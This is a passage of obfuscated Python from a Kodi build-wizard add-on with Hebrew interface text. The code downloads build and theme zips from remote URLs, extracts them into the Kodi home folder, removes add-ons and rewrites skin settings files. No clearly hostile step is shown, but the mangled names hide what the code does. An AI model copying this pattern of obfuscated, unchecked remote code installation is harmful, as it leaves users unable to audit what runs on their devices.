		try :#line:3899
			OOO0O000OO00O0OO0 =open (O0OOO000O0O00OO0O ,'r')#line:3900
			O0O0O0O0O00O0O0O0 =OOO0O000OO00O0OO0 .read ()#line:3901
			OOO0O000OO00O0OO0 .close ()#line:3902
			O0OOO000OO00O00OO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3903
			O0OOOOOO000OO0O0O =re .compile (O0OOO000OO00O00OO ).findall (O0O0O0O0O00O0O0O0 )[0 ]#line:3904
			OOO0O000OO00O0OO0 =open (O0OOO000O0O00OO0O ,'w')#line:3905
			OOO0O000OO00O0OO0 .write (O0O0O0O0O00O0O0O0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OOOOOO000OO0O0O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3906
			OOO0O000OO00O0OO0 .close ()#line:3907
		except :#line:3908
				pass #line:3909
		swapSkins ('skin.Premium.mod')#line:3910
def buildWizard (O0O00OOOO0O00OO0O ,O00000OOO0000O0OO ,theme =None ,over =False ):#line:3913
	OOOO00O0OOO0000OO =xbmcgui .DialogBusy ()#line:3914
	OOOO00O0OOO0000OO .create ()#line:3915
	if over ==False :#line:3916
		OOOOOOOO00OOO00OO =wiz .checkBuild (O0O00OOOO0O00OO0O ,'url')#line:3917
		if USERNAME =='':#line:3918
			ADDON .openSettings ()#line:3919
			sys .exit ()#line:3920
		if PASSWORD =='':#line:3921
			ADDON .openSettings ()#line:3922
			sys .exit ()#line:3923
		if BUILDNAME =='':#line:3925
			O000OO0O00OOOOOO0 =u_list (SPEEDFILE )#line:3926
			(O000OO0O00OOOOOO0 )#line:3927
		if OOOOOOOO00OOO00OO ==False :#line:3928
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3933
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3934
			return #line:3935
		O0O0O0000O0000O00 =wiz .workingURL (OOOOOOOO00OOO00OO )#line:3936
		if O0O0O0000O0000O00 ==False :#line:3937
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0O0O0000O0000O00 ))#line:3938
			return #line:3939
	if O00000OOO0000O0OO =='gui':#line:3940
		if O0O00OOOO0O00OO0O ==BUILDNAME :#line:3941
			if over ==True :OO0OO0OOO00O0OO0O =1 #line:3942
			else :OO0OO0OOO00O0OO0O =1 #line:3943
		else :#line:3944
			OO0OO0OOO00O0OO0O =1 #line:3945
		if OO0OO0OOO00O0OO0O :#line:3946
			remove_addons ()#line:3947
			remove_addons2 ()#line:3948
			debridit .debridIt ('update','all')#line:3949
			traktit .traktIt ('update','all')#line:3950
			O0OO0OO0OO0O0O0OO =wiz .checkBuild (O0O00OOOO0O00OO0O ,'gui')#line:3951
			OOOO0OO0OOOO0000O =O0O00OOOO0O00OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3952
			if not wiz .workingURL (O0OO0OO0OO0O0O0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3953
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3954
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOOO0O00OO0O ),'','אנא המתן')#line:3955
			OO0O0OOOOO000O000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO0OO0OOOO0000O )#line:3956
			try :os .remove (OO0O0OOOOO000O000 )#line:3957
			except :pass #line:3958
			logging .warning (O0OO0OO0OO0O0O0OO )#line:3959
			if 'google'in O0OO0OO0OO0O0O0OO :#line:3960
			   O0O00O00OOOO0OO0O =googledrive_download (O0OO0OO0OO0O0O0OO ,OO0O0OOOOO000O000 ,DP ,wiz .checkBuild (O0O00OOOO0O00OO0O ,'filesize'))#line:3961
			else :#line:3964
			  downloader .download (O0OO0OO0OO0O0O0OO ,OO0O0OOOOO000O000 ,DP )#line:3965
			xbmc .sleep (100 )#line:3966
			OO0OOOOO0O0OOOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOOO0O00OO0O )#line:3967
			DP .update (0 ,OO0OOOOO0O0OOOOOO ,'','אנא המתן')#line:3968
			extract .all (OO0O0OOOOO000O000 ,HOME ,DP ,title =OO0OOOOO0O0OOOOOO )#line:3969
			DP .close ()#line:3970
			wiz .defaultSkin ()#line:3971
			wiz .lookandFeelData ('save')#line:3972
			wiz .kodi17Fix ()#line:3973
			if KODIV >=18 :#line:3974
				skindialogsettind18 ()#line:3975
			debridit .debridIt ('restore','all')#line:3976
			traktit .traktIt ('restore','all')#line:3977
			if INSTALLMETHOD ==1 :OO00OO0O0OO0OO0OO =1 #line:3979
			elif INSTALLMETHOD ==2 :OO00OO0O0OO0OO0OO =0 #line:3980
			else :DP .close ()#line:3981
			O0O0OOOO00O0O0000 =(NOTIFICATION2 )#line:3982
			OOOOOO000OO0OOO00 =urllib2 .urlopen (O0O0OOOO00O0O0000 )#line:3983
			OO00OOOO0OOOOOO0O =OOOOOO000OO0OOO00 .readlines ()#line:3984
			OO0O0O00O00000OOO =0 #line:3985
			for OO000O0OOOO0OO00O in OO00OOOO0OOOOOO0O :#line:3988
				if OO000O0OOOO0OO00O .split (' ==')[0 ]=="noreset"or OO000O0OOOO0OO00O .split ()[0 ]=="noreset":#line:3989
					xbmc .executebuiltin ("ReloadSkin()")#line:3991
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3992
					update_Votes ()#line:3993
					indicatorfastupdate ()#line:3994
				if OO000O0OOOO0OO00O .split (' ==')[0 ]=="reset"or OO000O0OOOO0OO00O .split ()[0 ]=="reset":#line:3995
					update_Votes ()#line:3997
					indicatorfastupdate ()#line:3998
					resetkodi ()#line:3999
		else :#line:4008
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4009
	if O00000OOO0000O0OO =='gui2':#line:4010
		if O0O00OOOO0O00OO0O ==BUILDNAME :#line:4011
			if over ==True :OO0OO0OOO00O0OO0O =1 #line:4012
			else :OO0OO0OOO00O0OO0O =1 #line:4013
		else :#line:4014
			OO0OO0OOO00O0OO0O =1 #line:4015
		if OO0OO0OOO00O0OO0O :#line:4016
			remove_addons ()#line:4017
			remove_addons2 ()#line:4018
			O0OO0OO0OO0O0O0OO =wiz .checkBuild (O0O00OOOO0O00OO0O ,'gui')#line:4019
			OOOO0OO0OOOO0000O =O0O00OOOO0O00OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4020
			if not wiz .workingURL (O0OO0OO0OO0O0O0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4021
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4022
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOOO0O00OO0O ),'','אנא המתן')#line:4023
			OO0O0OOOOO000O000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO0OO0OOOO0000O )#line:4024
			try :os .remove (OO0O0OOOOO000O000 )#line:4025
			except :pass #line:4026
			logging .warning (O0OO0OO0OO0O0O0OO )#line:4027
			if 'google'in O0OO0OO0OO0O0O0OO :#line:4028
			   O0O00O00OOOO0OO0O =googledrive_download (O0OO0OO0OO0O0O0OO ,OO0O0OOOOO000O000 ,DP ,wiz .checkBuild (O0O00OOOO0O00OO0O ,'filesize'))#line:4029
			else :#line:4032
			  downloader .download (O0OO0OO0OO0O0O0OO ,OO0O0OOOOO000O000 ,DP )#line:4033
			xbmc .sleep (100 )#line:4034
			OO0OOOOO0O0OOOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOOO0O00OO0O )#line:4035
			DP .update (0 ,OO0OOOOO0O0OOOOOO ,'','אנא המתן')#line:4036
			extract .all (OO0O0OOOOO000O000 ,HOME ,DP ,title =OO0OOOOO0O0OOOOOO )#line:4037
			DP .close ()#line:4038
			wiz .defaultSkin ()#line:4039
			wiz .lookandFeelData ('save')#line:4040
			if INSTALLMETHOD ==1 :OO00OO0O0OO0OO0OO =1 #line:4043
			elif INSTALLMETHOD ==2 :OO00OO0O0OO0OO0OO =0 #line:4044
			else :DP .close ()#line:4045
		else :#line:4047
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4048
	elif O00000OOO0000O0OO =='fresh':#line:4049
		freshStart (O0O00OOOO0O00OO0O )#line:4050
	elif O00000OOO0000O0OO =='normal':#line:4051
		if url =='normal':#line:4052
			if KEEPTRAKT =='true':#line:4053
				traktit .autoUpdate ('all')#line:4054
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4055
			if KEEPREAL =='true':#line:4056
				debridit .autoUpdate ('all')#line:4057
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4058
			if KEEPLOGIN =='true':#line:4059
				loginit .autoUpdate ('all')#line:4060
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4061
		O000O0O0O0O00000O =int (KODIV );O0OOOO0000O0OO00O =int (float (wiz .checkBuild (O0O00OOOO0O00OO0O ,'kodi')))#line:4062
		if not O000O0O0O0O00000O ==O0OOOO0000O0OO00O :#line:4063
			if O000O0O0O0O00000O ==16 and O0OOOO0000O0OO00O <=15 :OO00OOO0OOO00O00O =False #line:4064
			else :OO00OOO0OOO00O00O =True #line:4065
		else :OO00OOO0OOO00O00O =False #line:4066
		if OO00OOO0OOO00O00O ==True :#line:4067
			OO00O0O00OOOOO000 =1 #line:4068
		else :#line:4069
			if not over ==False :OO00O0O00OOOOO000 =1 #line:4070
			else :OO00O0O00OOOOO000 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4071
		if OO00O0O00OOOOO000 :#line:4072
			wiz .clearS ('build')#line:4073
			O0OO0OO0OO0O0O0OO =wiz .checkBuild (O0O00OOOO0O00OO0O ,'url')#line:4074
			OOOO0OO0OOOO0000O =O0O00OOOO0O00OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4075
			if not wiz .workingURL (O0OO0OO0OO0O0O0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4076
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4077
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O0O00OOOO0O00OO0O ,wiz .checkBuild (O0O00OOOO0O00OO0O ,'version')),'','אנא המתן')#line:4078
			OO0O0OOOOO000O000 =os .path .join (PACKAGES ,'%s.zip'%OOOO0OO0OOOO0000O )#line:4079
			try :os .remove (OO0O0OOOOO000O000 )#line:4080
			except :pass #line:4081
			logging .warning (O0OO0OO0OO0O0O0OO )#line:4082
			if 'google'in O0OO0OO0OO0O0O0OO :#line:4083
			   O0O00O00OOOO0OO0O =googledrive_download (O0OO0OO0OO0O0O0OO ,OO0O0OOOOO000O000 ,DP ,wiz .checkBuild (O0O00OOOO0O00OO0O ,'filesize'))#line:4084
			else :#line:4087
			  downloader .download (O0OO0OO0OO0O0O0OO ,OO0O0OOOOO000O000 ,DP )#line:4088
			xbmc .sleep (1000 )#line:4089
			OO0OOOOO0O0OOOOOO ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOOO0O00OO0O ,wiz .checkBuild (O0O00OOOO0O00OO0O ,'version'))#line:4090
			DP .update (0 ,OO0OOOOO0O0OOOOOO ,'','אנא המתן...')#line:4091
			O0OO000OO00000O0O ,O0O0O0000O0OOO0O0 ,OO0O0O0OO0000O00O =extract .all (OO0O0OOOOO000O000 ,HOME ,DP ,title =OO0OOOOO0O0OOOOOO )#line:4092
			if int (float (O0OO000OO00000O0O ))>0 :#line:4093
				try :#line:4094
					wiz .fixmetas ()#line:4095
				except :pass #line:4096
				wiz .lookandFeelData ('save')#line:4097
				wiz .defaultSkin ()#line:4098
				wiz .setS ('buildname',O0O00OOOO0O00OO0O )#line:4100
				wiz .setS ('buildversion',wiz .checkBuild (O0O00OOOO0O00OO0O ,'version'))#line:4101
				wiz .setS ('buildtheme','')#line:4102
				wiz .setS ('latestversion',wiz .checkBuild (O0O00OOOO0O00OO0O ,'version'))#line:4103
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4104
				wiz .setS ('installed','true')#line:4105
				wiz .setS ('extract',str (O0OO000OO00000O0O ))#line:4106
				wiz .setS ('errors',str (O0O0O0000O0OOO0O0 ))#line:4107
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO000OO00000O0O ,O0O0O0000O0OOO0O0 ))#line:4108
				fastupdatefirstbuild (NOTEID )#line:4109
				wiz .kodi17Fix ()#line:4110
				skin_homeselect ()#line:4111
				skin_lower ()#line:4112
				rdbuildinstall ()#line:4113
				try :gaiaserenaddon ()#line:4114
				except :pass #line:4115
				adults18 ()#line:4116
				skinfix18 ()#line:4117
				try :os .remove (OO0O0OOOOO000O000 )#line:4119
				except :pass #line:4120
				O0OO0OOO0000O0000 =(ADDON .getSetting ("auto_rd"))#line:4121
				if O0OO0OOO0000O0000 =='true':#line:4122
					try :#line:4123
						setautorealdebrid ()#line:4124
					except :pass #line:4125
				try :#line:4126
					autotrakt ()#line:4127
				except :pass #line:4128
				O00OOO000O0OOO00O =(ADDON .getSetting ("imdb_on"))#line:4129
				if O00OOO000O0OOO00O =='true':#line:4130
					imdb_synck ()#line:4131
				iptvset ()#line:4132
				DP .close ()#line:4140
				O00OOO0O000O000OO =wiz .themeCount (O0O00OOOO0O00OO0O )#line:4141
				builde_Votes ()#line:4142
				indicator ()#line:4143
				if not O00OOO0O000O000OO ==False :#line:4144
					buildWizard (O0O00OOOO0O00OO0O ,'theme')#line:4145
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4146
				if INSTALLMETHOD ==1 :OO00OO0O0OO0OO0OO =1 #line:4147
				elif INSTALLMETHOD ==2 :OO00OO0O0OO0OO0OO =0 #line:4148
				else :resetkodi ()#line:4149
				if OO00OO0O0OO0OO0OO ==1 :wiz .reloadFix ()#line:4151
				else :wiz .killxbmc (True )#line:4152
			else :#line:4153
				if isinstance (O0O0O0000O0OOO0O0 ,unicode ):#line:4154
					OO0O0O0OO0000O00O =OO0O0O0OO0000O00O .encode ('utf-8')#line:4155
				OOOO000O0OO0OOO00 =open (OO0O0OOOOO000O000 ,'r')#line:4156
				OOO00O00O0O0OO0O0 =OOOO000O0OO0OOO00 .read ()#line:4157
				OOOOOO00OO00OO000 =''#line:4158
				for O0OOO00O0000OO0OO in O0O00O00OOOO0OO0O :#line:4159
				  OOOOOO00OO00OO000 ='key: '+OOOOOO00OO00OO000 +'\n'+O0OOO00O0000OO0OO #line:4160
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O0O0OO0000O00O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOOOOO00OO00OO000 )#line:4161
		else :#line:4162
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4163
	elif O00000OOO0000O0OO =='theme':#line:4164
		if theme ==None :#line:4165
			O00OOO0O000O000OO =wiz .checkBuild (O0O00OOOO0O00OO0O ,'theme')#line:4166
			OO00OO0OOO0O0O00O =[]#line:4167
			if not O00OOO0O000O000OO =='http://'and wiz .workingURL (O00OOO0O000O000OO )==True :#line:4168
				OO00OO0OOO0O0O00O =wiz .themeCount (O0O00OOOO0O00OO0O ,False )#line:4169
				if len (OO00OO0OOO0O0O00O )>0 :#line:4170
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0O00OOOO0O00OO0O ,COLOR1 ,len (OO00OO0OOO0O0O00O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4171
						wiz .log ("Theme List: %s "%str (OO00OO0OOO0O0O00O ))#line:4172
						O000000OO0O0O0OOO =DIALOG .select (ADDONTITLE ,OO00OO0OOO0O0O00O )#line:4173
						wiz .log ("Theme install selected: %s"%O000000OO0O0O0OOO )#line:4174
						if not O000000OO0O0O0OOO ==-1 :theme =OO00OO0OOO0O0O00O [O000000OO0O0O0OOO ];O00000OOO00OOO00O =True #line:4175
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4176
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4177
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4178
		else :O00000OOO00OOO00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0O00OOOO0O00OO0O ,wiz .checkBuild (O0O00OOOO0O00OO0O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4179
		if O00000OOO00OOO00O :#line:4180
			OOOOOO00OO0O00OOO =wiz .checkTheme (O0O00OOOO0O00OO0O ,theme ,'url')#line:4181
			OOOO0OO0OOOO0000O =O0O00OOOO0O00OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4182
			if not wiz .workingURL (OOOOOO00OO0O00OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4183
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4184
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4185
			OO0O0OOOOO000O000 =os .path .join (PACKAGES ,'%s.zip'%OOOO0OO0OOOO0000O )#line:4186
			try :os .remove (OO0O0OOOOO000O000 )#line:4187
			except :pass #line:4188
			downloader .download (OOOOOO00OO0O00OOO ,OO0O0OOOOO000O000 ,DP )#line:4189
			xbmc .sleep (1000 )#line:4190
			DP .update (0 ,"","Installing %s "%O0O00OOOO0O00OO0O )#line:4191
			OO00O0OOO000O0O00 =False #line:4192
			if url not in ["fresh","normal"]:#line:4193
				OO00O0OOO000O0O00 =testTheme (OO0O0OOOOO000O000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4194
				OO0OOO0OOOO0O0000 =testGui (OO0O0OOOOO000O000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4195
				if OO00O0OOO000O0O00 ==True :#line:4196
					wiz .lookandFeelData ('save')#line:4197
					OOO0O00000000O0OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4198
					O0OO000O00OOO000O =xbmc .getSkinDir ()#line:4199
					skinSwitch .swapSkins (OOO0O00000000O0OO )#line:4201
					OO00OOOO0OOOOOO0O =0 #line:4202
					xbmc .sleep (1000 )#line:4203
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00OOOO0OOOOOO0O <150 :#line:4204
						OO00OOOO0OOOOOO0O +=1 #line:4205
						xbmc .sleep (1000 )#line:4206
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4207
						wiz .ebi ('SendClick(11)')#line:4208
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4209
					xbmc .sleep (1000 )#line:4210
			OO0OOOOO0O0OOOOOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4211
			DP .update (0 ,OO0OOOOO0O0OOOOOO ,'','אנא המתן')#line:4212
			O0OO000OO00000O0O ,O0O0O0000O0OOO0O0 ,OO0O0O0OO0000O00O =extract .all (OO0O0OOOOO000O000 ,HOME ,DP ,title =OO0OOOOO0O0OOOOOO )#line:4213
			wiz .setS ('buildtheme',theme )#line:4214
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OO000OO00000O0O ,O0O0O0000O0OOO0O0 ))#line:4215
			DP .close ()#line:4216
			if url not in ["fresh","normal"]:#line:4217
				wiz .forceUpdate ()#line:4218
				if KODIV >=17 :wiz .kodi17Fix ()#line:4219
				if OO0OOO0OOOO0O0000 ==True :#line:4220
					wiz .lookandFeelData ('save')#line:4221
					wiz .defaultSkin ()#line:4222
					O0OO000O00OOO000O =wiz .getS ('defaultskin')#line:4223
					skinSwitch .swapSkins (O0OO000O00OOO000O )#line:4224
					OO00OOOO0OOOOOO0O =0 #line:4225
					xbmc .sleep (1000 )#line:4226
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00OOOO0OOOOOO0O <150 :#line:4227
						OO00OOOO0OOOOOO0O +=1 #line:4228
						xbmc .sleep (1000 )#line:4229
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4231
						wiz .ebi ('SendClick(11)')#line:4232
					wiz .lookandFeelData ('restore')#line:4233
				elif OO00O0OOO000O0O00 ==True :#line:4234
					skinSwitch .swapSkins (O0OO000O00OOO000O )#line:4235
					OO00OOOO0OOOOOO0O =0 #line:4236
					xbmc .sleep (1000 )#line:4237
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00OOOO0OOOOOO0O <150 :#line:4238
						OO00OOOO0OOOOOO0O +=1 #line:4239
						xbmc .sleep (1000 )#line:4240
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4242
						wiz .ebi ('SendClick(11)')#line:4243
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4244
					wiz .lookandFeelData ('restore')#line:4245
				else :#line:4246
					wiz .ebi ("ReloadSkin()")#line:4247
					xbmc .sleep (1000 )#line:4248
					wiz .ebi ("Container.Refresh")#line:4249
		else :#line:4250
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4251
def skin_homeselect ():#line:4255
	try :#line:4257
		OO0OO0OOO0O0OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4258
		O000O000OO0000OOO =open (OO0OO0OOO0O0OO00O ,'r')#line:4260
		OO0O00OO0OO0O000O =O000O000OO0000OOO .read ()#line:4261
		O000O000OO0000OOO .close ()#line:4262
		OOOO0OOO00O0OO0OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4263
		OOOOOOOO0O0OOO0O0 =re .compile (OOOO0OOO00O0OO0OO ).findall (OO0O00OO0OO0O000O )[0 ]#line:4264
		O000O000OO0000OOO =open (OO0OO0OOO0O0OO00O ,'w')#line:4265
		O000O000OO0000OOO .write (OO0O00OO0OO0O000O .replace ('<setting id="HomeS" type="string%s/setting>'%OOOOOOOO0O0OOO0O0 ,'<setting id="HomeS" type="string"></setting>'))#line:4266
		O000O000OO0000OOO .close ()#line:4267
	except :#line:4268
		pass #line:4269
def skin_lower ():#line:4272
	OO00OO0OOOOOO00OO =(ADDON .getSetting ("lower"))#line:4273
	if OO00OO0OOOOOO00OO =='true':#line:4274
		try :#line:4277
			O000O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4278
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'r')#line:4280
			O0OOOOOOO0O0O0000 =OO00OOO000OO00OOO .read ()#line:4281
			OO00OOO000OO00OOO .close ()#line:4282
			OO00OOO00O00O000O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4283
			OOOO000OO000O00O0 =re .compile (OO00OOO00O00O000O ).findall (O0OOOOOOO0O0O0000 )[0 ]#line:4284
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'w')#line:4285
			OO00OOO000OO00OOO .write (O0OOOOOOO0O0O0000 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOO000OO000O00O0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4286
			OO00OOO000OO00OOO .close ()#line:4287
			O000O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4289
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'r')#line:4291
			O0OOOOOOO0O0O0000 =OO00OOO000OO00OOO .read ()#line:4292
			OO00OOO000OO00OOO .close ()#line:4293
			OO00OOO00O00O000O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4294
			OOOO000OO000O00O0 =re .compile (OO00OOO00O00O000O ).findall (O0OOOOOOO0O0O0000 )[0 ]#line:4295
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'w')#line:4296
			OO00OOO000OO00OOO .write (O0OOOOOOO0O0O0000 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOO000OO000O00O0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4297
			OO00OOO000OO00OOO .close ()#line:4298
			O000O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4300
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'r')#line:4302
			O0OOOOOOO0O0O0000 =OO00OOO000OO00OOO .read ()#line:4303
			OO00OOO000OO00OOO .close ()#line:4304
			OO00OOO00O00O000O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4305
			OOOO000OO000O00O0 =re .compile (OO00OOO00O00O000O ).findall (O0OOOOOOO0O0O0000 )[0 ]#line:4306
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'w')#line:4307
			OO00OOO000OO00OOO .write (O0OOOOOOO0O0O0000 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOO000OO000O00O0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4308
			OO00OOO000OO00OOO .close ()#line:4309
			O000O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4313
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'r')#line:4315
			O0OOOOOOO0O0O0000 =OO00OOO000OO00OOO .read ()#line:4316
			OO00OOO000OO00OOO .close ()#line:4317
			OO00OOO00O00O000O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4318
			OOOO000OO000O00O0 =re .compile (OO00OOO00O00O000O ).findall (O0OOOOOOO0O0O0000 )[0 ]#line:4319
			OO00OOO000OO00OOO =open (O000O00OOO00O0O00 ,'w')#line:4320
